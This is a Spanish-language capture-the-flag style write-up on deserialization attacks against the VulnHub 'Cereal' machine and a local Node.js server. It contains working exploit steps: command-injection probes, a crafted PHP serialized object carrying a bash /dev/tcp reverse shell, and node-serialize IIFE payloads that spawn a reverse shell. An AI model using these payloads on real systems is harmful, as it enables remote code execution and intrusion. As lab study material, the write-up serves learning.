------
- Tags: #vulnerabilidades #serial #web
-----
# Definición

> Los **ataques de deserialización** son un tipo de ataque que aprovecha las vulnerabilidades en los procesos de **serialización** y **deserialización** de objetos en aplicaciones que utilizan la programación orientada a objetos (**POO**).

La serialización es el proceso de convertir un objeto en una secuencia de **bytes** que puede ser almacenada o transmitida a través de una red. La deserialización es el proceso inverso, en el que una secuencia de bytes es convertida de nuevo a un objeto. Los ataques de deserialización ocurren cuando un atacante puede manipular los datos que se están deserializando, lo que puede llevar a la **ejecución de código malicioso** en el servidor.

Los ataques de deserialización pueden ocurrir en diferentes tipos de aplicaciones, incluyendo aplicaciones web, aplicaciones móviles y aplicaciones de escritorio. Estos ataques pueden ser explotados de varias maneras, como:

- Modificar el objeto serializado antes de que sea enviado a la aplicación, lo que puede causar errores en la deserialización y permitir que un atacante ejecute código malicioso.
- Enviar un objeto serializado malicioso que aproveche una vulnerabilidad en la aplicación para ejecutar código malicioso.
- Realizar un ataque de “**man-in-the-middle**” para interceptar y modificar el objeto serializado antes de que llegue a la aplicación.

Los ataques de deserialización pueden ser muy peligrosos, ya que pueden permitir que un atacante tome el control completo del servidor o la aplicación que está siendo atacada.

Para evitar estos ataques, es importante que las aplicaciones validen y autentiquen adecuadamente todos los datos que reciben antes de deserializarlos. También es importante utilizar bibliotecas de serialización y deserialización seguras y actualizar regularmente todas las bibliotecas y componentes de la aplicación para corregir posibles vulnerabilidades.

------
# Empleando máquina vulnerable "Cereal"

Lo primero que haremos será ir al siguiente [link](https://www.vulnhub.com/entry/cereal-1,703/) en donde descargaremos en versión *OVA* **Download (Mirror)** la máquina virtual de *Cereal 1*, luego ejecutaremos el OVF y montaremos la máquina. 
Es importante revisar las configuraciones de la máquina colocando el adaptador de red en *Bridged* para que por DHCP el router asigne IP a esta máquina en la misma subred para poder verla desde nuestra máquina de atacante.

Lo único que restaría hacer es encender la máquina y dejarla en segundo plano para poder manipular todo desde nuestra máquina de atacante.

----
## Reconocimiento

Emplearemos como siempre el uso de ``arp-scan -I ens33 --localhost --ignoredups`` para detectar la máquina que contenga *VMware* y así hallar su IP (*192.168.0.120*), luego emplearemos un reconocimiento básico con ``nmap`` enumerando todos los puertos existentes y para los puertos que estén abiertos enumerar servicios y versiones.

- ``nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.0.120 -oG allPorts``
- ``nmap -sCV -p21,22,80,139,445,3306,11111,22222,22223,33333,33334,44441,44444,55551,55555 192.168.0.120 -oN targeted``

Veremos muchos servicios pero por ahora solo nos centraremos en el *puerto 80(http)* y en el *puerto 44441* que posee un servicio apache también.

Al ver que son webs comunes, comenzaremos con la herramienta ``gobuster`` a hacer un **descubrimiento de rutas**

- ``gobuster dir -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://192.168.0.120``

Descubriremos dos rutas que no conocíamos, las cuales son */admin* y */blog* para el *puerto 80*

Entraremos a la ruta */blog* y comenzaremos a enumerar información con la herramienta ``whatweb`` y con ``wappalyzer``, algo a tener en cuenta es que la web se ve "poco estética" ya que tal vez por detrás se este aplicando **Virtual Hosting**, por lo que al ingresar a la web mediante la IP no se terminan de cargar los componentes del todo. Lo que podemos hacer frente a este caso es presionar CTRL+U para ver el código fuente y ver si la web toma alguna referencia de alguna web en particular, en este caso si.

![[ATK D 1.png]]

Por lo tanto si hiciéramos un ``ping -c 1 cereal.ctf`` no recibiríamos señal de la web, esto se debe a que no tenemos contemplado ese dominio en nuestro */etc/hosts*. Lo que debemos hacer en este caso es agregar en nuestro */etc/hosts* que la ip *192.168.0.120* corresponde al dominio *cereal.ctf*.

![[ATK D 2.png]]

Si hiciéramos un ping luego de agregar el dominio, recibiríamos un paquete, es decir, la web *cereal.ctf* nos responde.

------

Una vez reconocida la web por nuestra máquina con el ``ping -c 1 cereal.ctf``, ingresaremos a la misma ruta */blog* pero con el nuevo dominio obtenido para ver la ruta con todos sus componentes.

![[ATK D 3.png]]

------

Lo que haremos ahora será realizar un reconocimiento de Subdominios para la web http://cereal.ctf:44441/, cabe destacar que cuando se aplica **Virtual Hosting**, tanto en los servicios de Apache como los de Nginx nosotros podremos indicar también que en función del subdominio que pongamos por determinado puerto, indicar a que ruta del sistema queremos que nos resuelva para que nos muestre el contenido web correspondiente. 

==Algo importante== a tener en cuenta es que si nosotros aplicáramos un reconocimiento de subdominios sobre este puerto http://cereal.ctf:44441/ frente al *puerto 80*, es posible que en el 44441 encuentre subdominios y sobre el 80 no, por lo tanto debemos tener cuidado en casos como este donde hay múltiples servicios *HTTP* corriendo, en ese caso ==HAY QUE ENUMERAR TODOS LOS SUBDOMINIOS PARA TODOS LOS SERVICIOS WEB QUE ENCONTREMOS.==

Necesario colocar la flag ``--append-domain`` para que tome el correcto porque si no dará muchos subdominios con *error 400.*

- ``gobuster vhost -u http://cereal.ctf:44441/ -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -t 20 --apend-domain``

![[ATK D 4.png]]

Este dominio también tendremos que contemplarlo en nuestro */etc/hosts*

![[ATK D 5.png]]

![[ATK D 6.png]]

Este será el panel que **vamos a vulnerar**.

----
## Explotación

Lo que tenemos en frente es un **Ping Tester**, que lo que hace es enviar Pings al dominio que especifiquemos.

Nos podremos en escucha con la herramienta ``tcpdump`` para ver si al enviarnos un ping a nosotros recibimos el paquete o no.

- ``tcpdump -i ens33 icmp -n`` 

- **``-i``** para ponernos en escucha por la interfaz de red "*ens33*"
- **``icmp``** para ponernos en escucha de trazas de tipo "*icmp*"
- **``-n``** para que no aplique resolución *DNS*

Luego enviamos un *PING* desde el Ping Tester que está en el servicio web hacia nuestra máquina de atacante.

![[ATK D 7.png]]

Al ver que los paquetes nos llegan, como atacantes podríamos **testear si el Ping Tester no se encuentra sanitizado**, ya que probablemente por detrás esté ocurriendo el siguiente escenario:

Supongamos que **el campo** donde colocamos la *IP* a la que le queremos hacer ping se llame ``ip_address``, esto por detrás en *PHP* puede estár definido de esta forma ``system("ping -c 3 ip-que-coloquemos" . $_POST['ip_address']);`` por lo tanto si colocamos una IP cualquiera en el campo de la web, y luego colocamos ``; whoami`` le estaríamos indicando que además de hacer el ping ejecute el comando ``whoami``, si nos da respuesta al comando, es que **NO ESTÁ SANITIZADA**, por lo tanto es VULNERABLE a **RCE**.

- Diferentes formas de verificar si está **sanitizada** la web
	- ``192.168.0.193; whoami``
	- ``192.168.0.193 && whoami``
	- ``3458324354 || whoami`` ---------> Como esta IP no existe le decimos que haga el whoami con un *OR*.

En esta máquina la web está sanitizada, por lo tanto ningún comando de los anteriores funcionará.

----

Procederemos a interceptar con **Burpsuite** la petición que se envía a la hora de efectuar el Ping con el *Ping Tester*, de esta manera **identificaremos el objeto** que se está enviando como tal y de esta forma nos daríamos cuenta que podríamos emplear un **Ataque de deserialización**.

![[ATK D 8.png]]

Si **seleccionamos** todo el valor de la petición de abajo y presionamos ``CTRL+SHIFT+U `` podremos **decodificarlo**.

![[ATK D 9.png]]

Esto es un objeto que **se está transportando por la red** y nosotros lo hemos **interceptado**.

- ``O:8`` (*O = Objeto*) hace alusión a que el objeto tiene 8 caracteres de longitud --> **pingTest** es el objeto, tiene 8 caracteres de longitud.

Luego se indican las propiedades o atributos 

- ``s:9`` (*s = String*) hace alusión a que hay una "string" de 9 caracteres de longitud --> **ipAddress** es la string, ya que tiene 9 caracteres.
- ``s:13`` (*s = String*) hace alusión a que hay otra "string" pero de 13 caracteres de longitud --> **192.168.0.193** es la string, ya que tiene 13 caracteres (con los puntos incluidos).

De primeras la información está viajando en formato **Serializado**, al nosotros darle al botón de **Send** en Burpsuite lo que sucede es que enviamos el objeto y el servidor procede a **Deserializar** e **Interpretar** lo que nosotros le estamos enviando, para luego en base a esto se ejecute una **función** o un **método**, es decir una serie de acciones sobre esta entidad/objeto, que en este caso lo que hace es un ``ping``.

----
### PHP Deserialization Attack

Iremos a la web http://secure.cereal.ctf:44441/ y presionamos ``CTRL+U`` para ver el código fuente. Nuestro objetivo es encontrar algún archivo que la web haga referencia para poder ver su contenido, y en ese archivo encontrar información acerca del proceso de **Serializado** y **Deserializado** que posee, como no hay nada de interés, otra vez haremos un ataque de fuerza bruta con la herramienta ``gobuster`` en busca de rutas, pero esta vez con un **diccionario mas grande**.

- ``gobuster dir -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -u http://secure.cereal.ctf:44441/ -t 20``

![[ATK D 10.png]]

Si ingresamos a ese directorio veremos un *403 Forbidden*, por lo tanto no tenemos capacidad de lectura de los archivos que allí existan, pero lo que podemos hacer como ya sabemos el nombre del directorio, es hacer FUZZING de los archivos que puedan llegar a existir.

Muchas veces hay archivos existentes que poseen la extensión ``php.bak`` o ``.backup``, siempre que estemos enumerando tenemos que pensar en todas las posibilidades de lo archivos que puedan llegar a existir, por lo tanto podríamos indicarle al *gobuster* que queremos listar archivos que tengan la extensión ``php.bak`` con el parámetro ``-x``

- ``gobuster dir -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -u http://secure.cereal.ctf:44441/back_en/ -t 20 -x php.bak``

![[ATK D 11.png]]

Si nos metemos a esa URL http://secure.cereal.ctf:44441/back_en/index.php.bak veremos lo siguiente

![[ATK D 12.png]]

Esta será la clave para entender que es lo que está pasando por detrás, por lo tanto si miramos el código fuente con ``CTRL+U`` y si prestamos atención veremos una línea similar a la que creíamos que corría por detrás antes la cual es ``system("ping -c 3 ip-que-coloquemos" . $_POST['ip_address']);``, por lo tanto este código se ve mas **interesante**, copiaremos todo el contenido y lo meteremos en un archivo *index.php* para analizar y entender lo que sucede.

Las líneas que nos interesan a nosotros son las siguientes

```php
<?php

class pingTest {
	public $ipAddress = "127.0.0.1";
	public $isValid = False;
	public $output = "";

	function validate() {
		if (!$this->isValid) {
			if (filter_var($this->ipAddress, FILTER_VALIDATE_IP))
			{
				$this->isValid = True;
			}
		}
		$this->ping();

	}

	public function ping()
        {
		if ($this->isValid) {
			$this->output = shell_exec("ping -c 3 $this->ipAddress");	
		}
        }

}

if (isset($_POST['obj'])) {
	$pingTest = unserialize(urldecode($_POST['obj']));
} else {
	$pingTest = new pingTest;
}

$pingTest->validate();

?>
```

Este código lo que está haciendo es mediante una función ``validate()`` validar cuando una IP está siendo colocada, por defecto en la clase ``pingtest`` la propiedad ``$isvalid`` está en *False*, pero si la función ``validate()`` detecta que hay una IP real en el campo, entonces lo convierte a *True* y procede a llamar a la función ``ping()``, esta es la manera que tiene la web de sanitizarnos el ``; whoami`` que colocamos antes. 
Si llegamos a colocar una IP verdadera, el campo ``$isvalid`` pasa a ser *True* y procede a llamar a la función ``ping()`` que lo que haces es enviar un Ping a la *IP* proporcionada, si no colocamos una IP, por defecto le hará un ping a la IP que esté en el campo ``$ipAddress`` la cual es *127.0.0.1*. 
Otra cosa que podemos notar es que no hay ningún tipo de sanitización en el campo donde se realiza el ``"ping -c 3 $this->ipAddress"`` por lo tanto la petición confía en el objeto que el usuario le envía, recordemos que cuando colocamos una IP esta **pasa en formato serializado como un objeto por la red**.

Mas abajo en el condicional donde se nombra ``'obj'`` es donde se muestra el proceso que se realiza al hora de recibir un objeto por la red, comienza **deserializando** y luego se **decodifica**, en caso de que no se proporcione un objeto en el campo, **automáticamente se llamará a la clase** o objeto ``pingTest``, es decir, envía el Ping por defecto al **localhost**.

-----

Nosotros como atacantes al notar que **no existe sanitización en el campo donde se efectúa el ping** lo que podemos hacer es intentar modificar la clase/objeto a nuestro gusto para realizar acciones que deseemos, por lo tanto procederemos a copiar la clase ``pingTest`` con sus propiedades incluidas.


Lo que haremos será crear un archivo llamado *serialize.php* y meterle la definición de la clase, luego cambiar en el campo ``$ipAddress`` la IP por ``"; bash -c 'bash -i >& /dev/tcp/192.168.0.193/443 0>&1'";`` y en el campo ``$isvalid`` por *True*.
Además intentaremos aprovecharnos de la clase para **crear la data ya serializada** ``echo urlencode(serialize(new pingTest));`` para que al enviar el objeto el mismo servidor lo **Deserialice** y luego lo **interprete**.

```php
--------CAMPO ORIGINAL---------

class pingTest {
	public $ipAddress = "127.0.0.1";
	public $isValid = False;
	public $output = "";
	}
	
--------CAMPO ORIGINAL---------

------CAMPO MODIFICADO---------

class pingTest {
	public $ipAddress = "; bash -c 'bash -i >& /dev/tcp/192.168.0.193/443 0>&1'";
	public $isValid = True;
	public $output = "";
	}

echo urlencode(serialize(new pingTest));
------CAMPO MODIFICADO---------
```

Una vez tengamos nuestra clase modificada en nuestro archivo *serialize.php* debemos recordar que el objeto cuando lo enviábamos a través de **Burpsuite**, se enviaba en formato **URLENCODEADO** por lo tanto le haremos lo siguiente.

- ``php serialize.php``

Lo que nos brinde el comando anterior será lo que **debamos colocar como objeto** en la petición de **Burpsuite**, y como nosotros colocamos una **Reverse Shell** al *puerto 443* en el campo de ``ipAddress``, debemos estar en escucha por ese puerto.

![[ATK D 13.png]]

![[ATK D 14.png]]

Quedando de la **siguiente manera**

![[ATK D 15.png]]

Ahora si nosotros nos ponemos en escucha con ``nc -nlvp 443`` y enviamos la petición, nos llegará la **Reverse Shell** y tendremos acceso a la máquina ==Cereal==.

![[ATK D 16.png]]

Hemos llevado a cabo un **ataque de deserialización en PHP**. Este tipo de ataque ocurre cuando logramos **manipular un objeto** para **ejecutar una acción inesperada** o acceder a partes del código que originalmente no deberían ser accesibles.

La vulnerabilidad surge porque el sistema confía en que el objeto no será modificado, ya que se asume que se utilizarán los valores predeterminados definidos para el objeto. Sin embargo, al explotar esta confianza, hemos podido alterar el objeto y acceder a áreas del código que, en principio, no deberían ser inyectables o manipulables.

En resumen, el ataque de deserialización nos permitió modificar el comportamiento del código de una manera que no estaba prevista, mostrando una debilidad en la seguridad del sistema.

### Node js Deserialization Attack

Nos apoyaremos en este caso del siguiente [link](https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/) y seguiremos las instrucciones copiando el código para montarnos un servidor en local.
Pegaremos todo el código en un archivo llamado *server.js* que crearemos, luego haremos un ``node server.js`` para ver que no nos permitirá abrir el servidor ya que habrá ciertas cosas que debemos cargar a nivel de módulos. 

NPM es una herramienta fundamental en el desarrollo con JavaScript. Corresponde con las siglas de *Node Package Manager*

- ``npm install express node-serialize cookie-parser``

Ahora haremos denuevo en ``node server.js`` y el servidor estará montado en el *puerto 3000*.

Nos dirigiremos al http://localhost:3000 y interceptaremos la petición con **Burpsuite**, luego veremos que en la petición hay una *Cookie* que está en **Base64** y **Urlencodeada**, la copiaremos y la decodificaremos.

![[ATK D 17.png]]

Luego modificaremos el campo "*username*" colocando nuestro nombre, en mi caso "*c4sp*", y procederemos a pasarlo a **Base64** y luego a **Urlencode** nuevamente.

![[ATK D 18.png]]

Lo que está claro es que la data que se envía serializada por detrás el servidor **nos la interpreta** y en base a lo que reciba **nos representa cierta información**.

Ahora procederemos a **copiaremos de la web la función que nos otorgan** para serializar datos.

```js
var y = {
 rce : function(){
 require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) });
 },
}
var serialize = require('node-serialize');
console.log("Serialized: \n" + serialize.serialize(y));
```

Pegaremos este código en un archivo llamado **serialize.js**. Esta función se encargará de **serializarnos algo que le pasemos**, y en este caso se está enviando un ``ls /``, de primeras esto no se debería ejecutar, lo que sucederá es que nos va a serializar la instrucción como tal, de forma que si hacemos un ``node serialize.js`` tendremos la función serializada correctamente.

- ``{"rce":"_$$ND_FUNC$$_function(){\n require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) });\n }"}``

De esta manera al enviarlo al servidor sería interpretado, pero de primeras no debería ejecutarlo. 

Algo a tener en cuenta es que hay un concepto llamado **``IIFE``** que viene de *Immediately Invoked Function Expression* que lo que nos permite es invocar o hacer la llamada inmediatamente, por ejemplo lo haremos en la serialización. Para hacer esto entraremos al archivo *serialize.js* y agregaremos ``()``.

```js
var y = {
 rce : function(){
 require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) });
 }(),
}
var serialize = require('node-serialize');
console.log("Serialized: \n" + serialize.serialize(y));
```

Y si ahora ejecutamos ``node serialize.js``, a la hora de serializarlo en vez de mostrarnos el oneliner anterior, nos ejecuta el comando ``ls /``.

![[ATK D 20.png]]

Cabe destacar que esto es de cara a la serialización, lo que el servidor hace es que la **data que yo serializo/envío** me lo **deserializa**, por lo tanto la instrucción estaría interesante que **nos la ejecutara el servidor** a la hora de **Deserializar la data**, esto se puede hacer perfectamente, para esto debemos eliminar el *IIFE* ``()`` del archivo *serialize.js* para volver a tener el dato serializado como antes en el oneliner.

En la web se nos comparte además del código anterior para **Serializar** la data un código para **Deserializar** la data

```js
var serialize = require('node-serialize');
var payload = '';
serialize.unserialize(payload);
```

Copiaremos este código y lo meteremos en un archivo llamado *unserialize.js*. 
Lo que tenemos que entender es que la **variable** ``payload`` es lo que nosotros deseemos colocar, por lo tanto dentro de este campo vamos a tener que colocar la **data serializada** que nos brinda el comando ``node serialize.js`` para que luego el código lo **Deserialice**. ==Importante tener en cuenta que hay que quitar los saltos de linea  "\n" y escapar con "\" las comillas simples de adentro, todo esto quedando así.==

```js
var serialize = require('node-serialize');
var payload = '{"rce":"_$$ND_FUNC$$_function(){require(\'child_process\').exec(\'ls /\', function(error, stdout, stderr) { console.log(stdout) });}"}';
serialize.unserialize(payload);
```

Ahora si con ``node unserialize.js`` lo ejecutamos, no sucederá nada, pero si colocamos el ``IIFE ()`` antes de las ultimas dobles comillas en la variable **payload** tal que así

- ``var payload = '{"rce":"_$$ND_FUNC$$_function(){require(\'child_process\').exec(\'ls /\', function(error, stdout, stderr) { console.log(stdout) });}()"}';``

Y luego ejecutamos con ``node userialize.js`` nuevamente, nos dará el **output** del comando ``ls /``

-----

Ahora lo que restaría sería entablar una **Reverse Shell** a través de este concepto. En la web se nos otorga un [código](https://github.com/ajinabraham/Node.Js-Security-Course/blob/master/nodejsshell.py) funcional para poder entablarla correctamente.

Iremos al código en formato RAW, copiaremos la URL y con ``wget`` lo descargaremos.

- ``wget https://raw.githubusercontent.com/ajinabraham/Node.Js-Security-Course/master/nodejsshell.py``

- ``python2.7 nodejsshell.py 192.168.0.194 4646``

Copiaremos todo el **Encoding** que se encargará de entablarnos la **Reverse Shell**.

Meteremos todo el contenido de *serialize.js* serializado con ``node serialize.js`` en un archivo llamado *data* por ejemplo y lo modificaremos para poder acoplarle el **Encoding brindado por el script** de la Reverse Shell.

Primero borraremos la antigua instrucción.

![[ATK D 21.png]]

Dentro de los corchetes **meteremos nuestro código de la Reverse Shell** y seguido de los corchetes el ``IIFE ()``

![[ATK D 22.png]]

Ahora lo ultimo que resta es **pasar todo el código entero a Base64** ==Sin el "#" del final== porque así es como lo interpreta el servidor.

![[ATK D 23.png]]

------

Ahora lo que restaría sería copiar toda la cadena en Base64, ponernos en escucha con ``nc -nlvp 4646`` por el *puerto 4646* como especificamos y **pegar toda la cadena en la petición de la web** en Burpsuite.

![[ATK D 24.png]]

![[ATK D 25.png]]

De esta forma habríamos vulnerado la web con un **Ataque de deserialización** por Node JS.